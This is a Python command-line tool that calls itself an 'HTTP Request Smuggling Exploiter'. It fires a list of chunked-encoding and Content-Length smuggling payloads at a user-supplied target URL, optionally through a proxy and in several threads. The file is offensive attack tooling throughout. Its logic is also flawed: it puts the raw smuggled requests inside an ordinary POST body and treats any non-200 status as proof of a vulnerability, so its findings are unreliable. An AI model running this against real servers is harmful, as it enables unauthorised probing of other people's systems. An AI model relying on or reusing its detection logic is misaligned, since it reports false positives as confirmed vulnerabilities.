import requests
import threading
import time
import random
import sys
import argparse
import os
from colorama import Fore, Style
from urllib.parse import urlparse

# Constants for colors
SUCCESS_COLOR = Fore.GREEN
INFO_COLOR = Fore.YELLOW
ERROR_COLOR = Fore.RED
RESET_COLOR = Style.RESET_ALL

# Common HTTP Smuggling Payloads
smuggling_payloads = [
    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n5\r\n0\r\n\r\n",
    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n5\r\n0\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n0\r\n\r\n",
    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n0\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n5\r\n\r\n",
    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 5\r\n\r\n0\r\n5\r\n\r\n",
    "POST / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n0\r\n5\r\n\r\n",
    "GET / HTTP/1.1\r\nHost: {0}\r\nTransfer-Encoding: chunked\r\nContent-Length: 0\r\n\r\n0\r\n5\r\n\r\n"
]

# Function to test request smuggling on a given URL
def test_smuggling(url, proxy=None, verbose=False):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36"
    }
    
    if verbose:
        print(f"{INFO_COLOR}[*] Testing URL: {url}{RESET_COLOR}")

    # Loop through payloads
    for payload in smuggling_payloads:
        # Create a custom request with the smuggling payload
        smuggling_payload = payload.format(urlparse(url).hostname)
        response = send_request(url, smuggling_payload, headers, proxy, verbose)
        
        # Check if smuggling is successful
        if response:
            if response.status_code != 200:
                print(f"{SUCCESS_COLOR}[+] Smuggling detected with payload: {payload}{RESET_COLOR}")
                print(f"{SUCCESS_COLOR}[+] Response Status: {response.status_code}{RESET_COLOR}")
                print(f"{SUCCESS_COLOR}[+] Response: {response.text[:200]}{RESET_COLOR}")
                return True  # Smuggling success

    print(f"{ERROR_COLOR}[-] No smuggling vulnerability found for URL: {url}{RESET_COLOR}")
    return False

# Function to send the HTTP request with a specific payload
def send_request(url, payload, headers, proxy, verbose):
    try:
        if verbose:
            print(f"{INFO_COLOR}[*] Sending payload: {payload[:50]}...{RESET_COLOR}")
        
        # Send the request
        if proxy:
            proxies = {
                "http": proxy,
                "https": proxy
            }
            response = requests.post(url, data=payload, headers=headers, proxies=proxies, allow_redirects=True)
        else:
            response = requests.post(url, data=payload, headers=headers, allow_redirects=True)
        
        if verbose:
            print(f"{INFO_COLOR}[*] Response Code: {response.status_code}{RESET_COLOR}")
        return response
    except requests.exceptions.RequestException as e:
        print(f"{ERROR_COLOR}[!] Error: {str(e)}{RESET_COLOR}")
        return None

# Thread worker to handle testing in parallel
def worker(url, proxy, verbose):
    test_smuggling(url, proxy, verbose)

# Main function to handle argument parsing and execution
def main():
    parser = argparse.ArgumentParser(description="HTTP Request Smuggling Exploiter")
    parser.add_argument('--url', type=str, required=True, help='Target URL for testing')
    parser.add_argument('--proxy', type=str, help='Proxy server for routing requests (optional)')
    parser.add_argument('--verbose', action='store_true', help='Verbose output for testing process')
    parser.add_argument('--threads', type=int, default=1, help='Number of threads to run (default: 1)')

    args = parser.parse_args()
    
    # Check if URL was provided
    if not args.url:
        print(f"{ERROR_COLOR}[!] URL is required. Use --url <url>{RESET_COLOR}")
        sys.exit(1)
    
    # Prepare proxy
    proxy = args.proxy if args.proxy else None

    # Set up threading for concurrent testing
    threads = []
    for _ in range(args.threads):
        t = threading.Thread(target=worker, args=(args.url, proxy, args.verbose))
        threads.append(t)
        t.start()

    # Wait for all threads to complete
    for t in threads:
        t.join()

    print(f"{INFO_COLOR}[*] Testing complete!{RESET_COLOR}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"{ERROR_COLOR}[!] Script interrupted by user.{RESET_COLOR}")
        sys.exit(0)
